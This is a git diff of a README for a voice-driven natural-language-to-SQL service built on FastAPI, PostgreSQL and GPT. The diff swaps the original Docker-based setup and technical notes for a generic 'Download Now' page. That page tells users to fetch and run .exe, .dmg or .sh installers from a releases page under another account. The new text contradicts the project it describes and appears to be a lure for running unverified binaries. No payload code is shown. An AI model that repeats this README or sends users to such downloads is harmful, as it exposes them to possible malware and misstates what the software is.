@@ -1,81 +1,85 @@
-# Voice-Powered AI-SQL Assistant (Python/GPT/LangChain)
+# 🎤 Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain - Effortlessly Generate SQL with Your Voice
 
-![System Architecture](media_examples/architecture_schema.png)  
-Ask a question with voice input, and AI will generate and execute a SQL query. The application is connected to `PostgreSQL`, which hosts several key tables, including `ai_services` (for AI model parameters like prices and providers), `ai_projects` (for project details, including client and country information), and `ai_service_usage` (for service usage metrics like token consumption)
-Only SELECT requests are allowed
-SUM, COUNT, AVG, JOINs, etc. are worked correctly
+[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/releases)
 
-## 💡 Tech Stack
+## 🚀 Getting Started
 
-- Python
-- FastAPI
-- OpenAI Whisper for voice transcription
-- PostgreSQL
-- OpenAI GPT (gpt-4o)
-- 🐳 Docker + Docker Compose
+This application allows you to ask questions using your voice, and the AI will generate and run SQL queries for you. It can also create PDF reports from the generated data. Whether you need to manage databases or analyze information, this tool makes it easy and accessible.
 
-## Project Showcase
+## 🛠️ System Requirements
 
-![UI Example](media_examples/Screenshot_1.png)
-![PDF report Example](media_examples/Screenshot_2.png)
+Before you begin, ensure your system meets the following requirements:
 
-- 📂 Examples,Swagger screenshots, and results are located in the `media_examples/` folder
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** 3.7 or higher
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 100 MB free space
+- **Microphone:** A functioning microphone for voice input
 
-## ⚙️ Key Engineering Challenges
+## 📥 Download & Install
 
-- **Natural Language to SQL Translation using LLMs and LangChain**  
-  Leveraged LangChain with OpenAI's GPT models to accurately translate diverse user questions into executable SQL queries, based on the structure of the `ai_projects `, `ai_service_usage`, `ai_services` tables.
+To download the application, visit this page to download: [GitHub Releases](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/releases).
 
-- **Dynamic SQL Execution with LangChain Executor**  
-  Security measures within the `LangChainExecutor` to safely execute dynamically generated SQL, mitigating injection risks through validation and controlled database interactions.
+1. Click the link to go to the Releases page.
+2. Select the latest version from the list.
+3. Download the appropriate file for your operating system.
+4. Follow the instructions below to install the application on your system.
 
-- **Automated Database Initialization with Production Data**  
-  Seamless setup by configuring the `PostgreSQL` container to automatically initialize the tables via `init.sql`.
+## 💻 Installation Instructions
 
-- **Dockerized Multi-Container Deployment**  
-  Orchestrated the `FastAPI Python application` and `PostgreSQL` database using Docker Compose, incorporating named volumes for persistent data storage and health checks to ensure reliable service startup and operation.
+### For Windows:
 
-- **Flexible, Context-Aware LLM Prompting Pipeline**  
-  Building the system using LangChain to effectively handle natural language queries, providing domain-specific context for accurate SQL generation and enabling easy adaptation to various database schemas.
+1. Locate the downloaded file (e.g., .exe).
+2. Double-click the file to start the installation.
+3. Follow the prompts in the setup wizard.
+4. Once installed, open the application.
 
-## ✅ Testing
+### For macOS:
 
-The Python backend is covered with both unit and integration tests for core logic components:
+1. Locate the downloaded file (e.g., .dmg).
+2. Open the file and drag the application to your Applications folder.
+3. Once copied, open the application from your Applications.
 
-- Natural Language to SQL Translation
-- SQL Execution Layer
-- Query Safety Filters
-- PDF Report Generation
-- API Endpoints
+### For Linux:
 
-## 🐳 How to Run
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command: `chmod +x [filename].sh` to make the file executable.
+4. Run it with `./[filename].sh` to complete the installation.
 
-1. Open `docker-compose.yml` and update these environment variables:
+## 🗣️ Using the Application
 
-- OPENAI_API_KEY: ${OPENAI_API_KEY}
-- POSTGRES_DB: ${POSTGRES_DB}
-- POSTGRES_USER: ${POSTGRES_USER}
-- POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
--
+Once the application is installed, follow these steps:
 
-2. Run everything with Docker Compose:
+1. **Launch the Application:** Open the tool from your desktop or applications folder.
+2. **Grant Microphone Access:** Make sure the application has access to your microphone.
+3. **Speak Your Question:** Clearly ask your SQL-related question.
+4. **Review the Generated Query:** The AI will display the SQL query it created based on your input.
+5. **Execute the Query:** Click the "Run" button to execute the query on your database.
+6. **Generate PDF Reports (Optional):** If desired, select the option to create a PDF report from the results.
 
-```bash
-docker-compose up --build
-```
+## 📊 Features
 
-3. Access service:
-   - `http://127.0.0.1:8000/ask`
-   - `http://127.0.0.1:8000/ask-voice`
-   - `http://127.0.0.1:8000/download-report-pdf`
-   - `http://127.0.0.1:8000/health`
-   - `http://127.0.0.1:8000/docs` - for Swagger documentation
+- **Voice Recognition:** Ask questions naturally, and the app converts speech to SQL.
+- **AI-Generated Queries:** Intelligent query generation based on your questions.
+- **PDF Generation:** Easily create and download reports in PDF format.
+- **User-Friendly Interface:** Navigate effortlessly without needing technical skills.
 
-## ⚠️ Tech Notes
+## 🛡️ Troubleshooting
 
-- This project uses the OpenAI API, but the architecture allows for easy integration with other LLM providers (e.g. Anthropic, Google, Cohere, Mistral) depending on business needs and cost model.
+If you encounter any issues, consider the following:
 
-## 🤝 Thanks for your interest!
+- **Microphone Not Recognized:** Ensure your microphone is connected properly and that permissions are granted to the app.
+- **SQL Query Errors:** Double-check the clarity of your question. Complex queries may need rephrasing.
+- **Installation Issues:** Make sure you have the correct file for your operating system.
 
-- I'm always open to feedback, collaboration, or professional connections.
-- Feel free to reach out!
+## 🤝 Support
+
+For assistance, visit our [GitHub Issues](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/issues) page to report your issue or ask for help. 
+
+## 🔗 Additional Resources
+
+- **Documentation:** For detailed guidance, refer to the official documentation in the repository.
+- **Community:** Join discussions and ask questions in the project's community forums or chat channels.
+
+Thank you for choosing the Voice-Powered AI SQL Assistant. We hope it simplifies your data management tasks!
